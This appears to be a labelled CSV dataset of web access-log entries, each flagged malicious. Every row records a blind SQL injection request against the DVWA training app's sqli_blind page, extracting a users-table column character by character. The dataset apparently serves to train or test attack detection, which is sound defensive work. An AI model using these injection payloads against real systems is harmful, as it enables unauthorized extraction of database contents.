ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,malicious
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C10%2C1%29%29%3E67%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C10%2C1%29%29%3E57%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C10%2C1%29%29%3E52%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C10%2C1%29%29%3E49%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C10%2C1%29%29%3E50%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E47%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E1%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E24%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E35%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E29%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E32%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E30%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C11%2C1%29%29%3E31%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E64%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E32%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E48%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E56%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E52%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E50%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C12%2C1%29%29%3E49%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E47%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E87%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E67%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E57%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E52%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E49%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C13%2C1%29%29%3E50%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E47%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E87%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E67%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E57%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E62%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E59%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C14%2C1%29%29%3E58%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E64%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E32%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E48%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E40%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E44%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E46%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C15%2C1%29%29%3E47%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E47%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E87%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E67%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E57%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,404,4728,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E52%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E54%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
192.168.1.11,28/Feb/2021:19:29:03 -0400,/vulnerabilities/sqli_blind/?id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28last_login%20AS%20NCHAR%29%2C0x20%29%20FROM%20dvwa.users%20ORDER%20BY%20%60user%60%20LIMIT%201%2C1%29%2C16%2C1%29%29%3E55%20AND%20%27sTHP%27%3D%27sTHP&Submit=Submit ,200,1696,"""-""",Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729),1
